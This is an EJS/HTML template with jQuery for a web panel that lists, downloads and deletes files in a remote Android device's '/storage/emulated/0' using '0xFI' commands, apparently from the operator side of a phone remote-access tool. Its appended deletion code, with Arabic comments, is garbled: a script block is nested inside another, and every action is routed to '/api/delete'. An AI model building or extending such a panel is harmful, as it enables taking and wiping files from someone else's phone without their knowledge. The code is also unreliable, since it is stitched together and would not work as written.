<div class="ui segment">
    <div class="ui secondary menu">
        <div class="right menu">
            <button onclick="openDirectory(this, '/storage/emulated/0')" class="ui blue button dlop"> <i
                    class="icon home"></i>Home</button>
            <!-- Home = /storage/emulated/0 -->
        </div>
    </div>
    <table class="ui celled table">
        <thead>
            <tr>
                <th style="text-align: center" colspan="2">Files</th>
            </tr>
        </thead>
        <tbody>
            <% pageData.forEach((item) => { %>
            <tr>
                <td title="<%= item.path %>"><%= item.name %></td>
                <td class="collapsing">
                    <% if(!item.isDir) { %>
                    <button class="ui button dlop" onclick="downloadFile(this, '<%= item.path %>')">&nbsp;&nbsp;&nbsp;<i
                            class="icon download blue"></i></button>
                    <% } else { %>
                    <button class="ui button dlop"
                        onclick="openDirectory(this, '<%= item.path %>')">&nbsp;&nbsp;&nbsp;<i
                            class="icon folder open grey"></i></button>
                    <% } %>
                </td>
            </tr>
            <% }) %>
        </tbody>
    </table>

    <script>

        function openDirectory(element, path) {
            $(element).children().css("opacity", "0");
            $(element).addClass('blue');
            $(element).addClass('loading');
            $('.dlop').addClass('disabled');
            sendCommand('0xFI', {
                action: 'ls',
                path
            }, (error, message) => {
                if (error) {
                    setTimeout(() => {
                        showNotification('#f03434', error)
                        $(element).children().css("opacity", "1");
                        $(element).removeClass('blue');
                        $('.dlop').removeClass('loading')
                    }, 300)
                } else {
                    if (message === 'Requested') {
                        showNotification('#2ecc71', 'Requesting Files, Please Wait');
                        setTimeout(() => {
                            location.reload();
                        }, 500)
                    }
                }
            })
        }

        function downloadFile(element, path) {
            $(element).children().css("opacity", "0");
            $(element).addClass('green');
            $(element).addClass('loading');
            $('.dlop').addClass('disabled');
            sendCommand('0xFI', {
                action: 'dl',
                path
            }, (error, message) => {
                if (error) {
                    setTimeout(() => {
                        showNotification('#f03434', error)
                        $(element).children().css("opacity", "1");
                        $(element).removeClass('green');
                        $('.dlop').removeClass('disabled')
                    }, 300)
                } else {
                    if (message === 'Requested') {
                        setTimeout(() => {
                            $(element).children().css("opacity", "1");
                            $(element).removeClass('green');
                            $(element).removeClass('loading');
                            $('.dlop').removeClass('disabled')
                            showNotification('#2ecc71', 'Downloading File, It will be avaliable in `Downloads` Soon');
                        }, 300)
                    }
                }
            })
        }

        <div class="ui segment">
    <script>
        function deleteFile(element, path) {
            const confirmation = confirm("هل أنت متأكد أنك تريد حذف هذا الملف؟");
            if (!confirmation) return;

            $(element).children().css("opacity", "0");
            $(element).addClass('red loading');
            $('.dlop').addClass('disabled');

            sendCommand('0xFI', {
                action: 'rm',
                path: path
            }, (error, message) => {
                if (error) {
                    setTimeout(() => {
                        showNotification('#f03434', error);
                        $(element).children().css("opacity", "1");
                        $(element).removeClass('red loading');
                        $('.dlop').removeClass('disabled');
                    }, 300);
                } else {
                    setTimeout(() => {
                        $(element).closest('tr').remove(); // إزالة الصف من الجدول
                        showNotification('#2ecc71', 'تم حذف الملف بنجاح.');
                        $(element).children().css("opacity", "1");
                        $(element).removeClass('red loading');
                        $('.dlop').removeClass('disabled');
                    }, 300);
                }
            });
        }

        // وظيفة لإرسال الأوامر إلى الخادم
        function sendCommand(command, data, callback) {
            $.ajax({
                url: '/api/delete',
                type: 'POST',
                data: JSON.stringify(data),
                contentType: 'application/json',
                success: (response) => {
                    if (response && response.status) {
                        callback(null, response.status);
                    } else {
                        callback('خطأ في الاستجابة من الخادم', null);
                    }
                },
                error: (xhr, status, error) => {
                    callback(error, null);
                }
            });
        }

        // وظيفة لعرض الإشعارات
        function showNotification(color, message) {
            console.log(`%c${message}`, `color: ${color}`);
            // يمكنك استخدام مكتبة مثل toastr أو SweetAlert لعرض إشعارات مرئية
        }

        // تحميل الملفات عند تحميل الصفحة لأول مرة
        $(document).ready(function() {
            openDirectory(null, '/storage/emulated/0'); // تحميل الملفات من الدليل الرئيسي عند بدء التشغيل
        });
    </script>
</div>
